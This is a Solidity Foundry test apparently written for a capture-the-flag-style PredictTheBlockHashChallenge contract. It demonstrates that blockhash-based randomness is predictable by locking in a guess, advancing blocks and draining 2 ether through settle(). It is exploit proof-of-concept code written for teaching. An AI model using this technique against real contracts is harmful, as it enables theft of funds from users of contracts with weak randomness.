
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge public challenge;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 lockBlockNumber) public {
        vm.assume(lockBlockNumber > 0);
        vm.assume(lockBlockNumber < type(uint256).max - 257);

        address player = makeAddr("player");
        deal(player, 1 ether);

        vm.roll(lockBlockNumber);

        vm.startPrank(player);
        bytes32 predictableHash = blockhash(lockBlockNumber + 1);
        challenge.lockInGuess{value: 1 ether}(predictableHash);
        vm.stopPrank();

        vm.roll(lockBlockNumber + 1);
        vm.roll(lockBlockNumber + 2);

        bytes32 expectedAnswer = blockhash(lockBlockNumber + 1);

        uint256 contractBalanceBefore = address(challenge).balance;
        uint256 playerBalanceBefore = player.balance;

        vm.startPrank(player);
        challenge.settle();
        vm.stopPrank();

        uint256 contractBalanceAfter = address(challenge).balance;
        uint256 playerBalanceAfter = player.balance;

        assertEq(predictableHash, expectedAnswer, "Blockhash should be predictable");
        assertEq(contractBalanceAfter, contractBalanceBefore - 2 ether, "Contract should transfer 2 ether");
        assertEq(playerBalanceAfter, playerBalanceBefore + 2 ether, "Player should receive 2 ether");
    }
}
